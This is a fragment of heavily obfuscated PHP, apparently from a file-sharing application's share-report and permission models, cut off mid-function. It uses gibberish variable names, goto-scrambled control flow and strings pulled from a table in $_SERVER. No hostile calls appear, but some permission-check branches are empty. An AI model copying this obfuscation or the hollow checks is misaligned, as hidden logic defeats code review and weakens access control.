$F“¥Ñ´êìÏ); $Cíğ±ÄùÌ = array(); $c´Îïï´† = explode($D‚³ìÜ[47], $D‚³ìÜ[1801]); goto BºãêºÊ‚ö; e¤˜¼„œØĞ: if (isset($Aäé‘ğùì¾[$D‚³ìÜ[1788]])) { $this->_shareAuthSet($dŒÑØ‘’™™, $Aäé‘ğùì¾[$D‚³ìÜ[1788]]); } return !0; goto C„Šå¹¬È–; C„Šå¹¬È–: } private function _checkLinkShare($f„ÖîÜ¢Ü…, $B×¶µ¼È§“) { goto b‘Ï¬“ª²; fõÎïö–š®: $Dë¹¤ñÂÁŒ = $this->shareFileMeta($DÊƒé‹ã[$FÆ¬˜´ñˆ[435]]); if (isset($Dë¹¤ñÂÁŒ[$FÆ¬˜´ñˆ[366]]) && $Dë¹¤ñÂÁŒ[$FÆ¬˜´ñˆ[366]] == $FÆ¬˜´ñˆ[83]) { show_json(LNG($FÆ¬˜´ñˆ[1804]), !1); } goto B‘äÍò‰¢; b‘Ï¬“ª²: $FÆ¬˜´ñˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($f„ÖîÜ¢Ü…[$FÆ¬˜´ñˆ[461]] != $FÆ¬˜´ñˆ[83]) { return; } $b×å¹Ì³±¢ = $B×¶µ¼È§“[$FÆ¬˜´ñˆ[407]][$FÆ¬˜´ñˆ[385]]; goto bù­æ’Áù»; bù­æ’Áù»: if ($B×¶µ¼È§“[$FÆ¬˜´ñˆ[407]][$FÆ¬˜´ñˆ[29]] != $FÆ¬˜´ñˆ[171]) { $DŞ•¡¥ñİ = $this->_folderReport($b×å¹Ì³±¢); if (!$DŞ•¡¥ñİ) { return; } show_json(LNG($FÆ¬˜´ñˆ[1802]) . $FÆ¬˜´ñˆ[1803] . $DŞ•¡¥ñİ, !1); } $DÊƒé‹ã = Model($FÆ¬˜´ñˆ[759])->fileInfoGet($B×¶µ¼È§“[$FÆ¬˜´ñˆ[407]][$FÆ¬˜´ñˆ[385]]); if (!$DÊƒé‹ã) { return; } goto fõÎïö–š®; B‘äÍò‰¢: } private function _folderReport($aİŒò†“£) { goto eÅ™åÌÍÙÎ; eÅ™åÌÍÙÎ: $fä£ŸŒóÕâ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BßÇÖÓÔ¢â = array($fä£ŸŒóÕâ[435] => array($fä£ŸŒóÕâ[934], 0), $fä£ŸŒóÕâ[697] => 3); $bâÑ²ÖÎ‰¸ = Model($fä£ŸŒóÕâ[1805])->where($BßÇÖÓÔ¢â)->field($fä£ŸŒóÕâ[435])->select(); goto cåà‡²ÔÓÔ; cåà‡²ÔÓÔ: if (!$bâÑ²ÖÎ‰¸) { return !1; } $bâÑ²ÖÎ‰¸ = array_to_keyvalue($bâÑ²ÖÎ‰¸, $fä£ŸŒóÕâ[33], $fä£ŸŒóÕâ[435]); $D’Ü˜—Â¥Ò = $fä£ŸŒóÕâ[47] . $aİŒò†“£ . $fä£ŸŒóÕâ[47]; goto d—¶‰†©Ã‹; D’õƒö»ÛÑ: $fäñˆå´ÄÆ = array_to_keyvalue($FšÃ¤„á¡×, $fä£ŸŒóÕâ[33], $fä£ŸŒóÕâ[28]); $fäñˆå´ÄÆ[] = $A¤Ü’¾”É”[$fä£ŸŒóÕâ[28]]; return implode($fä£ŸŒóÕâ[8], $fäñˆå´ÄÆ); goto d¾éã…—±¢; e¥Ö†Šä¬ø: $Dù˜‹ôâÍ = substr($A¤Ü’¾”É”[$fä£ŸŒóÕâ[476]], strpos($A¤Ü’¾”É”[$fä£ŸŒóÕâ[476]], $D’Ü˜—Â¥Ò)); $BßÇÖÓÔ¢â = array($fä£ŸŒóÕâ[385] => array($fä£ŸŒóÕâ[7], trim($Dù˜‹ôâÍ, $fä£ŸŒóÕâ[47]))); $FšÃ¤„á¡× = Model($fä£ŸŒóÕâ[759])->where($BßÇÖÓÔ¢â)->field($fä£ŸŒóÕâ[28])->select(); goto D’õƒö»ÛÑ; d—¶‰†©Ã‹: $BßÇÖÓÔ¢â = array($fä£ŸŒóÕâ[435] => array($fä£ŸŒóÕâ[7], $bâÑ²ÖÎ‰¸), $fä£ŸŒóÕâ[476] => array($fä£ŸŒóÕâ[373], "\45{$D’Ü˜—Â¥Ò}\x25"), $fä£ŸŒóÕâ[413] => 0); $A¤Ü’¾”É” = Model($fä£ŸŒóÕâ[759])->where($BßÇÖÓÔ¢â)->field($fä£ŸŒóÕâ[1806])->find(); if (!$A¤Ü’¾”É”) { return !1; } goto e¥Ö†Šä¬ø; d¾éã…—±¢: } protected function remove($Bµ”ë„Æœ) { goto BÅ¢áÂ¸º; e¿”äÓÖç‡: $f âÍ¿ÍÍ½ = $this->where($FºŠàÇŒµ)->delete(); if ($f âÍ¿ÍÍ½) { Model($E¡§Ïª»ø[553])->where(array($E¡§Ïª»ø[456] => $Bµ”ë„Æœ))->delete(); } $fø•¬Ú’Ğª = is_array($Bµ”ë„Æœ) ? $Bµ”ë„Æœ[1] : array($Bµ”ë„Æœ); goto F¤ÅËáÕ‡; F¤ÅËáÕ‡: for ($CÅíô÷ƒÛĞ = 0; $CÅíô÷ƒÛĞ < count($fø•¬Ú’Ğª); $CÅíô÷ƒÛĞ++) { $f‰Û†‰Éå¿ = $this->getInfo($fø•¬Ú’Ğª[$CÅíô÷ƒÛĞ]); if ($f‰Û†‰Éå¿[$E¡§Ïª»ø[463]] == $E¡§Ïª»ø[83]) { Model($E¡§Ïª»ø[522])->eventShare($f‰Û†‰Éå¿[$E¡§Ïª»ø[385]], $E¡§Ïª»ø[1793]); } if ($f‰Û†‰Éå¿[$E¡§Ïª»ø[461]] == $E¡§Ïª»ø[83]) { Model($E¡§Ïª»ø[522])->eventShare($f‰Û†‰Éå¿[$E¡§Ïª»ø[385]], $E¡§Ïª»ø[1792]); } } return $f âÍ¿ÍÍ½; goto e‰‡ÄëÇî·; BÅ¢áÂ¸º: $E¡§Ïª»ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($Bµ”ë„Æœ)) { $Bµ”ë„Æœ = array($E¡§Ïª»ø[7], $Bµ”ë„Æœ); } $FºŠàÇŒµ = array($E¡§Ïª»ø[456] => $Bµ”ë„Æœ); goto e¿”äÓÖç‡; e‰‡ÄëÇî·: } protected function removeBySource($Bœ¾‰´¦‚) { goto f«í“Š‘; EŸœ°É•ã: $this->where($d‚×¿ä«)->delete(); Model($F˜Å†¯‡‡[553])->where($d‚×¿ä«)->delete(); goto B•†ÚÖâ›‹; FÁëÍÉ¢–„: $dè†¤Î‰»­ = array_to_keyvalue($dè†¤Î‰»­, $F˜Å†¯‡‡[33], $F˜Å†¯‡‡[456]); if (!$dè†¤Î‰»­) { return; } $d‚×¿ä« = array($F˜Å†¯‡‡[455] => array($F˜Å†¯‡‡[400], $dè†¤Î‰»­)); goto EŸœ°É•ã; f«í“Š‘: $F˜Å†¯‡‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d‚×¿ä« = array($F˜Å†¯‡‡[399] => array($F˜Å†¯‡‡[400], $Bœ¾‰´¦‚)); $dè†¤Î‰»­ = $this->field($F˜Å†¯‡‡[456])->where($d‚×¿ä«)->select(); goto FÁëÍÉ¢–„; B•†ÚÖâ›‹: } public function listAll($BòêÆáØİ×) { goto b¿ Ğ­Ø†; d¾×ÖùğĞ: $E©ØØ¿ù†Œ = $this->_makeOrder()->where($CÄ–Ö»øğ¥)->selectPage(20); if (empty($E©ØØ¿ù†Œ[$cÍ³÷ÍÍí[361]])) { return array(); } $this->_listDataApply($E©ØØ¿ù†Œ[$cÍ³÷ÍÍí[361]]); goto BõØæĞÀ›ß; BõØæĞÀ›ß: return $E©ØØ¿ù†Œ; goto bíÂË•Ò”; A±„ğÒ°µ: if ($BòêÆáØİ×[$cÍ³÷ÍÍí[710]]) { $d±Ë¯Ì¶ç… = $BòêÆáØİ×[$cÍ³÷ÍÍí[464]] ? $BòêÆáØİ×[$cÍ³÷ÍÍí[464]] : strtotime(date($cÍ³÷ÍÍí[1807])); $CÄ–Ö»øğ¥[$cÍ³÷ÍÍí[190]] = array($cÍ³÷ÍÍí[327], array($BòêÆáØİ×[$cÍ³÷ÍÍí[710]], $d±Ë¯Ì¶ç…)); } if ($BòêÆáØİ×[$cÍ³÷ÍÍí[29]]) { $CÄ–Ö»øğ¥[$BòêÆáØİ×[$cÍ³÷ÍÍí[29]]] = 1; } else { $CÄ–Ö»øğ¥[] = array($cÍ³÷ÍÍí[461] => array($cÍ³÷ÍÍí[934], 0), $cÍ³÷ÍÍí[463] => array($cÍ³÷ÍÍí[934], 0), $cÍ³÷ÍÍí[1782] => $cÍ³÷ÍÍí[1739]); } if ($BòêÆáØİ×[$cÍ³÷ÍÍí[1735]]) { $CÄ–Ö»øğ¥[] = array($cÍ³÷ÍÍí[458] => $BòêÆáØİ×[$cÍ³÷ÍÍí[1735]], $cÍ³÷ÍÍí[1395] => array($cÍ³÷ÍÍí[373], "\x25{$BòêÆáØİ×[$cÍ³÷ÍÍí[1735]]}\45"), $cÍ³÷ÍÍí[1782] => $cÍ³÷ÍÍí[1739]); } goto d¾×ÖùğĞ; b¿ Ğ­Ø†: $cÍ³÷ÍÍí =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÄ–Ö»øğ¥ = array(); if ($BòêÆáØİ×[$cÍ³÷ÍÍí[1490]]) { $CÄ–Ö»øğ¥[$cÍ³÷ÍÍí[1490]] = $BòêÆáØİ×[$cÍ³÷ÍÍí[1490]]; } goto A±„ğÒ°µ; bíÂË•Ò”: } public function listDataApply($cµ‡Ò„Ü) { $this->_listDataApply($cµ‡Ò„Ü); return $cµ‡Ò„Ü; } private function _listDataApply(&$A½ªçé×´—) { goto EÕĞŒ–È³Ó; D­×ï“íœ¶: $FÂÕÙ‡ = array_to_keyvalue($A½ªçé×´—, $E¼ñÖ…õÃ†[33], $E¼ñÖ…õÃ†[385]); $açÌ¾ÈÙµ‡ = Model($E¼ñÖ…õÃ†[759])->sourceListInfo($FÂÕÙ‡, !0); foreach ($A½ªçé×´— as &$B»˜ÔÓ¥±§) { $eŒ›¢Áéá  = $B»˜ÔÓ¥±§[$E¼ñÖ…õÃ†[1490]]; $B»˜ÔÓ¥±§[$E¼ñÖ…õÃ†[1808]] = $bÑïĞ„¼¡[$eŒ›¢Áéá ] ? $bÑïĞ„¼¡[$eŒ›¢Áéá ] : !1; $CÁ‰³’¿ïŒ = $B»˜ÔÓ¥±§[$E¼ñÖ…õÃ†[385]]; $B»˜ÔÓ¥±§[$E¼ñÖ…õÃ†[407]] = $açÌ¾ÈÙµ‡[$CÁ‰³’¿ïŒ] ? $açÌ¾ÈÙµ‡[$CÁ‰³’¿ïŒ] : !1; } goto D×³òøÁ³ğ; D×³òøÁ³ğ: unset($B»˜ÔÓ¥±§); goto fœ©•ÑâÍ; EÕĞŒ–È³Ó: $E¼ñÖ…õÃ† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÃåçêÖ°  = array_to_keyvalue($A½ªçé×´—, $E¼ñÖ…õÃ†[33], $E¼ñÖ…õÃ†[1490]); $bÑïĞ„¼¡ = Model($E¼ñÖ…õÃ†[494])->userListInfo(array_unique($bÃåçêÖ° )); goto D­×ï“íœ¶; fœ©•ÑâÍ: } private function _makeOrder($A¢¾Ù÷ñ‹ = '') { goto FÙï™Œ¨º; FÙï™Œ¨º: $fÁçõÒ¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÈÊ­ø•³Á = array($fÁçõÒ¼[190], $fÁçõÒ¼[464], $fÁçõÒ¼[1795], $fÁçõÒ¼[1796]); $b•ÃõˆÔÅ = array($fÁçõÒ¼[418] => $fÁçõÒ¼[419], $fÁçõÒ¼[420] => $fÁçõÒ¼[421]); goto Fº”Ô„¤¢ò; a‹…†Ú©ë: $A¢¾Ù÷ñ‹ = $A¢¾Ù÷ñ‹ . "{$E¤Ìêš·ÊÄ}\40{$d‘šÖ¾ÔÂ}"; return $this->order($A¢¾Ù÷ñ‹); goto d©³°¹ëùÉ; Fº”Ô„¤¢ò: $E¤Ìêš·ÊÄ = Input::get($fÁçõÒ¼[423], $fÁçõÒ¼[7], $fÁçõÒ¼[405], $aÈÊ­ø•³Á); $d‘šÖ¾ÔÂ = Input::get($fÁçõÒ¼[424], $fÁçõÒ¼[7], $fÁçõÒ¼[1809], array($fÁçõÒ¼[1734], $fÁçõÒ¼[420])); $d‘šÖ¾ÔÂ = $b•ÃõˆÔÅ[$d‘šÖ¾ÔÂ]; goto a‹…†Ú©ë; d©³°¹ëùÉ: } public function reportAdd($Dì¹¼™Ê) { $a‡‰Ò¼ŠÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dƒêö¢¸‹ = array($a‡‰Ò¼ŠÆ[456] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[456]], $a‡‰Ò¼ŠÆ[1490] => USER_ID); if (Model($a‡‰Ò¼ŠÆ[1805])->where($dƒêö¢¸‹)->find()) { return !1; } $cµò¾¬¦·ä = array($a‡‰Ò¼ŠÆ[456] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[456]], $a‡‰Ò¼ŠÆ[1395] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[1395]], $a‡‰Ò¼ŠÆ[385] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[385]], $a‡‰Ò¼ŠÆ[435] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[435]], $a‡‰Ò¼ŠÆ[1490] => USER_ID, $a‡‰Ò¼ŠÆ[29] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[29]], $a‡‰Ò¼ŠÆ[421] => $Dì¹¼™Ê[$a‡‰Ò¼ŠÆ[421]]); return Model($a‡‰Ò¼ŠÆ[1805])->add($cµò¾¬¦·ä); } public function reportList($f«çù‘ê»¶) { goto Dµ“Ÿ¶ã; EÊ±´ˆ›½Æ: $a¶ù¶³Û®” = array($eË¯í‘åŞè[418] => $eË¯í‘åŞè[419], $eË¯í‘åŞè[420] => $eË¯í‘åŞè[421]); $a­Ø—²é = $eË¯í‘åŞè[1814] . $a¶ù¶³Û®”[$eß§É™µµ¹]; $b„¦ÜšÍÖ‚ = Model($eË¯í‘åŞè[1805])->where($C…ìõÀÜÚ…)->order($a­Ø—²é)->selectPage(20); goto fğÖİ²²¥ç; Dµ“Ÿ¶ã: $eË¯í‘åŞè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C…ìõÀÜÚ… = array(); if ($f«çù‘ê»¶[$eË¯í‘åŞè[710]]) { $aÀ¶øÔ… â = $f«çù‘ê»¶[$eË¯í‘åŞè[464]] ? $f«çù‘ê»¶[$eË¯í‘åŞè[464]] : strtotime(date($eË¯í‘åŞè[1807])); $C…ìõÀÜÚ…[$eË¯í‘åŞè[190]] = array($eË¯í‘åŞè[327], array($f«çù‘ê»¶[$eË¯í‘åŞè[710]], $aÀ¶øÔ… â)); } goto cìøÜˆÍ©˜; cìøÜˆÍ©˜: if (isset($f«çù‘ê»¶[$eË¯í‘åŞè[29]]) && in_array($f«çù‘ê»¶[$eË¯í‘åŞè[29]], array($eË¯í‘åŞè[83], $eË¯í‘åŞè[1810], $eË¯í‘åŞè[1811], $eË¯í‘åŞè[1812], $eË¯í‘åŞè[1813]))) { $C…ìõÀÜÚ…[$eË¯í‘åŞè[29]] = $f«çù‘ê»¶[$eË¯í‘åŞè[29]]; } if (isset($f«çù‘ê»¶[$eË¯í‘åŞè[697]]) && in_array($f«çù‘ê»¶[$eË¯í‘åŞè[697]], array($eË¯í‘åŞè[485], $eË¯í‘åŞè[83], $eË¯í‘åŞè[1810], $eË¯í‘åŞè[1811]))) { $C…ìõÀÜÚ…[$eË¯í‘åŞè[697]] = $f«çù‘ê»¶[$eË¯í‘åŞè[697]]; } $eß§É™µµ¹ = Input::get($eË¯í‘åŞè[424], $eË¯í‘åŞè[7], $eË¯í‘åŞè[1809], array($eË¯í‘åŞè[1734], $eË¯í‘åŞè[420])); goto EÊ±´ˆ›½Æ; fğÖİ²²¥ç: if (empty($b„¦ÜšÍÖ‚[$eË¯í‘åŞè[361]])) { return array(); } $this->_listDataApply($b„¦ÜšÍÖ‚[$eË¯í‘åŞè[361]]); return $b„¦ÜšÍÖ‚; goto F‘¹ÜÀ·‹Ó; F‘¹ÜÀ·‹Ó: } public function reportStatus($eƒ¦“ğ¬®­) { goto Aƒ®”°áòÃ; ašãÁÃÊÜ: $b©æ›Ã¬É = Model($BòÖ›ÓªˆÃ[1805])->where($b›“ƒ²â£)->save($f‘®™õç¨¹); if ($eƒ¦“ğ¬®­[$BòÖ›ÓªˆÃ[697]] == $BòÖ›ÓªˆÃ[1810]) { if ($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[435]] != $BòÖ›ÓªˆÃ[485] && $this->shareFileMeta($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[435]])) { $this->shareFileMeta($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[435]], 0); } $this->remove($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[456]]); return !0; } if ($b©æ›Ã¬É && $eƒ¦“ğ¬®­[$BòÖ›ÓªˆÃ[697]] == $BòÖ›ÓªˆÃ[1811]) { $Bˆ›â¤ÇøÉ = $f‘®™õç¨¹[$BòÖ›ÓªˆÃ[697]] == $BòÖ›ÓªˆÃ[1811] ? 1 : 0; $this->shareFileMeta($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[435]], $Bˆ›â¤ÇøÉ); $this->removeByFile($Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[435]]); } goto DêÜˆ×¦ Ó; DêÜˆ×¦ Ó: return $b©æ›Ã¬É; goto D¹¾õâŞÄÕ; Aƒ®”°áòÃ: $BòÖ›ÓªˆÃ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b›“ƒ²â£ = array($BòÖ›ÓªˆÃ[383] => $eƒ¦“ğ¬®­[$BòÖ›ÓªˆÃ[383]]); $Fö°Î°§ùÈ = Model($BòÖ›ÓªˆÃ[1805])->where($b›“ƒ²â£)->field($BòÖ›ÓªˆÃ[1815])->find(); goto b‹½ÒÊÆˆ‚; b‹½ÒÊÆˆ‚: if (!$Fö°Î°§ùÈ) { return !1; } $f‘®™õç¨¹ = array($BòÖ›ÓªˆÃ[697] => $eƒ¦“ğ¬®­[$BòÖ›ÓªˆÃ[697]]); if ($eƒ¦“ğ¬®­[$BòÖ›ÓªˆÃ[697]] == $BòÖ›ÓªˆÃ[1811] && $Fö°Î°§ùÈ[$BòÖ›ÓªˆÃ[697]] == $BòÖ›ÓªˆÃ[1811]) { $f‘®™õç¨¹[$BòÖ›ÓªˆÃ[697]] = 0; } goto ašãÁÃÊÜ; D¹¾õâŞÄÕ: } private function removeByFile($eŸ‹‚òİ‘ö) { goto a²É²˜Î„‚; a²É²˜Î„‚: $c¾º¯§»šÖ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dĞ¿¾¦²¨ = Model($c¾º¯§»šÖ[759])->where(array($c¾º¯§»šÖ[435] => $eŸ‹‚òİ‘ö))->field($c¾º¯§»šÖ[385])->select(); $C¬¥è¹Ü†Ò = array_to_keyvalue($dĞ¿¾¦²¨, $c¾º¯§»šÖ[33], $c¾º¯§»šÖ[385]); goto b‡¹âƒëŠ; dµ²÷ƒèË‰: $aî©Ğâ“Àİ = array_to_keyvalue($dĞ¿¾¦²¨, $c¾º¯§»šÖ[33], $c¾º¯§»šÖ[456]); $this->remove($aî©Ğâ“Àİ); goto E„­óÖñ¢”; b‡¹âƒëŠ: $fš§íÙá = array($c¾º¯§»šÖ[385] => array($c¾º¯§»šÖ[7], $C¬¥è¹Ü†Ò), $c¾º¯§»šÖ[461] => 1); $dĞ¿¾¦²¨ = Model($c¾º¯§»šÖ[1627])->where($fš§íÙá)->field($c¾º¯§»šÖ[456])->select(); if (empty($dĞ¿¾¦²¨)) { return; } goto dµ²÷ƒèË‰; E„­óÖñ¢”: } private function shareFileMeta($b¬¿¹ãßÙ, $fÁÍëÆ² = null) { $dÅã¡ğˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CĞŠÓó–¹Ş = array($dÅã¡ğˆ[435] => $b¬¿¹ãßÙ, $dÅã¡ğˆ[89] => $dÅã¡ğˆ[1816]); if (is_null($fÁÍëÆ²)) { return Model($dÅã¡ğˆ[1817])->where($CĞŠÓó–¹Ş)->find(); } $CĞŠÓó–¹Ş[$dÅã¡ğˆ[366]] = $fÁÍëÆ²; Model($dÅã¡ğˆ[1817])->add($CĞŠÓó–¹Ş, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\x63\145\x5f\141\165\164\x68"; public function getAuth($AÙ†­Ï×) { goto dºåÌƒ…²º; F‹šÇ–‹–„: $BßãÃ”†Š· = 2 << 25; foreach ($a›Æ¢òÏ³¾ as $Fœ¢ÖŞË¼) { goto f’Áò¾©‚¾; aÍÑ·‘Üè÷: $e­ŒÇ·æô» = 0; if ($Fœ¢ÖŞË¼[$AÉš„Ø—·«[387]] == SourceModel::TYPE_GROUP) { $e­ŒÇ·æô» = $BßãÃ”†Š· * 2; } if ($Fœ¢ÖŞË¼[$AÉš„Ø—·«[387]] == SourceModel::TYPE_USER) { $e­ŒÇ·æô» = $BßãÃ”†Š·; } goto aœ®øôôµ¿; f’Áò¾©‚¾: $D›»áË‹ƒ¿ = Model($AÉš„Ø—·«[1819])->listData($Fœ¢ÖŞË¼[$AÉš„Ø—·«[1799]]); if (!$D›»áË‹ƒ¿) { continue; } $BƒÍÌá¢É“[] = $Fœ¢ÖŞË¼; goto aÍÑ·‘Üè÷; aœ®øôôµ¿: if ($Fœ¢ÖŞË¼[$AÉš„Ø—·«[387]] == SourceModel::TYPE_USER && $Fœ¢ÖŞË¼[$AÉš„Ø—·«[473]] == $AÉš„Ø—·«[485]) { $e­ŒÇ·æô» = 0; } $EÙ»›Ÿ‘Ìä[] = $D›»áË‹ƒ¿[$AÉš„Ø—·«[392]] + $e­ŒÇ·æô»; goto D¼‡Ô†¢ø; D¼‡Ô†¢ø: } array_multisort($EÙ»›Ÿ‘Ìä, SORT_DESC, $BƒÍÌá¢É“); goto F‰Öµøğ ; F‰Öµøğ : return $BƒÍÌá¢É“; goto E¡»³£Íª; d–”óõŸÚÂ: $a›Æ¢òÏ³¾ = $this->field($c¸Ã¦¦¤‰Ò)->order($AÉš„Ø—·«[383])->where($DÙ—òÛ»ã´)->select(); $BƒÍÌá¢É“ = array(); $EÙ»›Ÿ‘Ìä = array(); goto F‹šÇ–‹–„; dºåÌƒ…²º: $AÉš„Ø—·« =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¸Ã¦¦¤‰Ò = $AÉš„Ø—·«[1818]; $DÙ—òÛ»ã´ = array($AÉš„Ø—·«[385] => $AÙ†­Ï×); goto d–”óõŸÚÂ; E¡»³£Íª: } public function setAuth($C–¤…‡ƒ«¯, $D‘ê„”œÂ) { goto B‘Œ”³Ú¬; B‘Œ”³Ú¬: $D’¦È¼˜” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dè³äÆÆœï = Model($D’¦È¼˜”[1167])->sourceInfo($C–¤…‡ƒ«¯); if (!$Dè³äÆÆœï) { return !1; } goto eÕ­˜©³¾ù; EŸ‘Ş¤”³­: foreach ($D‘ê„”œÂ as $B»˜Ôãªƒš) { if (!in_array($B»˜Ôãªƒš[$D’¦È¼˜”[387]], $cë”‘«İÉ‡)) { show_json(LNG($D’¦È¼˜”[1820]), !1); } if ($aÜí„àñ·ê != $eÕ“‰†¼Å) { if ($B»˜Ôãªƒš[$D’¦È¼˜”[387]] == SourceModel::TYPE_GROUP) { } if ($B»˜Ôãªƒš[$D’¦È¼˜”[473]] != 0 && !in_array($B»˜Ôãªƒš[$D’¦È¼˜”[473]], $d©Òê˜·²‚)) { } } if ($B»˜Ôãªƒš[$D’¦È¼˜”[473]] == 0) { $B»˜Ôãªƒš[$D’¦È¼˜”[387]] = SourceModel::TYPE_USER; } $d±Œİ‚Æ[] = array($D’¦È¼˜”[385] => $C–¤…‡ƒ«¯, $D’¦È¼˜”[387] => intval($B»˜Ôãªƒš[$D’¦È¼˜”[387]]), $D’¦È¼˜”[473] => intval($B»˜Ôãªƒš[$D’¦È¼˜”[473]]), $D’¦È¼˜”[1799] => intval($B»˜Ôãªƒš[$D’¦È¼˜”[1799]]) ? intval($B»˜Ôãªƒš[$D’¦È¼˜”[1799]]) : 0, $D’¦È¼˜”[1800] => intval($B»˜Ôãªƒš[$D’¦È¼˜”[1800]]) ? intval($B»˜Ôãªƒš[$D’¦È¼˜”[1800]]) : -1); } $this->where(array($D’¦È¼˜”[399] => $C–¤…‡ƒ«¯))->delete(); $this->addAll($d±Œİ‚Æ); goto a¾‹«Œæï¡; eÕ­˜©³¾ù: if ($Dè³äÆÆœï[$D’¦È¼˜”[387]] != SourceModel::TYPE_GROUP) { return !1; } $eÕ“‰†¼Å = 1; $aÜí„àñ·ê = $Dè³äÆÆœï[$D’¦È¼˜”[473]]; goto aØÍä»’ˆï; aØÍä»’ˆï: if ($aÜí„àñ·ê != $eÕ“‰†¼Å) { $BŞ˜Æ¯®¾ = array($D’¦È¼˜”[1650] => $aÜí„àñ·ê); $d©Òê˜·²‚ = Model($D’¦È¼˜”[1733])->field($D’¦È¼˜”[1490])->where($BŞ˜Æ¯®¾)->select(); $d©Òê˜·²‚ = array_to_keyvalue($d©Òê˜·²‚, $D’¦È¼˜”[33], $D’¦È¼˜”[1490]); } $cë”‘«İÉ‡ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $d±Œİ‚Æ = array(); goto EŸ‘Ş¤”³­; a¾‹«Œæï¡: return !0; goto bõï†×ª°…; bõï†×ª°…: } public function authClear($a‚ƒÛË†‡) { $B¾»óÆ›’¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dğó·”±‡ = Model($B¾»óÆ›’¬[1167])->sourceInfo($a‚ƒÛË†‡); $díğ»Ö‚’Ÿ = array($a‚ƒÛË†‡); if ($Dğó·”±‡[$B¾»óÆ›’¬[386]] == $B¾»óÆ›’¬[83]) { $f¯æÔĞ®È´ = array($B¾»óÆ›’¬[542] => array($B¾»óÆ›’¬[500], $Dğó·”±‡[$B¾»óÆ›’¬[476]] . $a‚ƒÛË†‡ . $B¾»óÆ›’¬[501])); $díğ»Ö‚’Ÿ = Model($B¾»óÆ›’¬[1167])->field($B¾»óÆ›’¬[399])->where($f¯æÔĞ®È´)->getField($B¾»óÆ›’¬[385], !0); $díğ»Ö‚’Ÿ[] = $a‚ƒÛË†‡; } $this->where(array($B¾»óÆ›’¬[399] => array($B¾»óÆ›’¬[400], $díğ»Ö‚’Ÿ)))->delete(); return !0; } public function getAllChildren($aÍéÒ•äÇ¿) { goto dšƒì„Ë‘¼; C‰ìø‡Õ¯å: if ($BäßÙË‘¬ò[$f¤×£õ¾â¦[478]] == $f¤×£õ¾â¦[485] && $BäßÙË‘¬ò[$f¤×£õ¾â¦[473]] != $Cİµà Ôİ) { $e´—¤ìÕš = $this->groupChidldAllRootSource($BäßÙË‘¬ò[$f¤×£õ¾â¦[473]]); } $E ¼˜ÒÈ˜— = $this->field($f¤×£õ¾â¦[385])->group($f¤×£õ¾â¦[385])->select(); $E ¼˜ÒÈ˜— = array_to_keyvalue($E ¼˜ÒÈ˜—, $f¤×£õ¾â¦[33], $f¤×£õ¾â¦[385]); goto CÏİÓÈ’Ä; dšƒì„Ë‘¼: $f¤×£õ¾â¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BäßÙË‘¬ò = Model($f¤×£õ¾â¦[1167])->sourceInfo($aÍéÒ•äÇ¿); if ($BäßÙË‘¬ò[$f¤×£õ¾â¦[386]] != $f¤×£õ¾â¦[83]) { return $this->sourceListAuth(array($aÍéÒ•äÇ¿)); } goto fÉ›¯Ê––›; CÏİÓÈ’Ä: if (!$E ¼˜ÒÈ˜—) { return array(); } $E†ÇŸÃÁ…í = $f¤×£õ¾â¦[1821]; $Bõ¶ˆˆ„¯ß = array($f¤×£õ¾â¦[385] => array($f¤×£õ¾â¦[7], $E ¼˜ÒÈ˜—), $f¤×£õ¾â¦[413] => $f¤×£õ¾â¦[485]); goto a•¯ËÁÖ; D¦«ğÚ»: return $this->sourceListAuth($fïŞÆò¯ê); goto Fù¸¿…Ğ®; a•¯ËÁÖ: $DÇ¼ïƒÊÒ¬ = Model($f¤×£õ¾â¦[759])->field($E†ÇŸÃÁ…í)->where($Bõ¶ˆˆ„¯ß)->select(); $fïŞÆò¯ê = array($aÍéÒ•äÇ¿); foreach ($DÇ¼ïƒÊÒ¬ as $Aˆ‹È×ö¡’) { foreach ($e´—¤ìÕš as $DÍ­ôïÁ¿ë) { $Cñ¯á°¶¬‡ = $f¤×£õ¾â¦[47] . $DÍ­ôïÁ¿ë . $f¤×£õ¾â¦[47]; $dà½Û øî— = $Aˆ‹È×ö¡’[$f¤×£õ¾â¦[476]] . $Aˆ‹È×ö¡’[$f¤×£õ¾â¦[385]] . $f¤×£õ¾â¦[47]; if (strstr($dà½Û øî—, $Cñ¯á°¶¬‡)) { $fïŞÆò¯ê[] = $Aˆ‹È×ö¡’[$f¤×£õ¾â¦[385]]; break; } } } goto D¦«ğÚ»; fÉ›¯Ê––›: if ($BäßÙË‘¬ò[$f¤×£õ¾â¦[387]] != SourceModel::TYPE_GROUP) { return array(); } $Cİµà Ôİ = 1; $e´—¤ìÕš = array($aÍéÒ•äÇ¿); goto C‰ìø‡Õ¯å; Fù¸¿…Ğ®: } private function sourceListAuth($bÊç´õëÚ’) { goto aÈŠ¿œ‚²; aÈŠ¿œ‚²: 